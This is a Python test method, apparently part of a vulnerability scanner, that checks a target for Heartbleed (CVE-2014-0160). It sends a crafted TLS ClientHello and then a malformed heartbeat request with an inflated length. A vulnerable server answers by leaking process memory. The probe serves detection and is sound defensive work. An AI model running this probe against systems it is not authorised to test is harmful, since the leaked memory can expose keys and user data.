    def test_w6_heartbleed(self):
        """W6 #41 — Heartbleed Detection (CVE-2014-0160).

        Sends a malformed Heartbeat (TLS extension type 15) with a
        claimed payload length of 0x4000 — vulnerable servers reply
        with up to 16KB of process memory.
        """
        if not self.deep: return
        self._print("[*]", "W6: Heartbleed...", "INFO")
        import socket
        parsed = urlparse(self.target)
        hostname = parsed.hostname
        if not hostname: return
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        if port != 443 and parsed.scheme != "https":
            return
        try:
            with socket.create_connection((hostname, port), timeout=8) as sock:
                client_hello = (
                    b"\x16\x03\x01\x00\xdc"
                    b"\x01\x00\x00\xd8"
                    b"\x03\x01"
                    + b"\x00" * 32
                    + b"\x00"
                    + b"\x00\x2e"
                    + b"\xc0\x2b\xc0\x2f\x00\x9e\x00\x9f"
                    + b"\xc0\x0a\xc0\x14\x00\x33\x00\x39"
                    + b"\xc0\x09\xc0\x13\x00\x32\x00\x38"
                    + b"\x00\xff"
                    + b"\x01\x00"
                    + b"\x00\x96"
                    + b"\x00\x0f\x00\x01\x01"
                    + b"\x00\x0a\x00\x08\x00\x06\x00\x17\x00\x18\x00\x19"
                    + b"\x00\x0b\x00\x02\x01\x00"
                    + b"\x00\x23\x00\x00"
                    + b"\x00\x33\x74\x00\x00"
                )
                sock.send(client_hello)
                resp = b""
                try:
                    while len(resp) < 5:
                        chunk = sock.recv(8192)
                        if not chunk: break
                        resp += chunk
                except socket.timeout:
                    pass
                if b"\x00\x0f" not in resp:
                    return
                payload = (
                    b"\x18\x03\x01\x00\x03"
                    b"\x01\x40\x00"
                )
                sock.send(payload)
                try:
                    leak = sock.recv(8192)
                except socket.timeout:
                    leak = b""
                if len(leak) > 7:
                    self._add_vuln("Heartbleed (CVE-2014-0160)", "CRITICAL",
                                    self.target,
                                    f"Server leaked {len(leak)} bytes after malformed heartbeat",
                                    cve="CVE-2014-0160")
        except Exception:
            pass

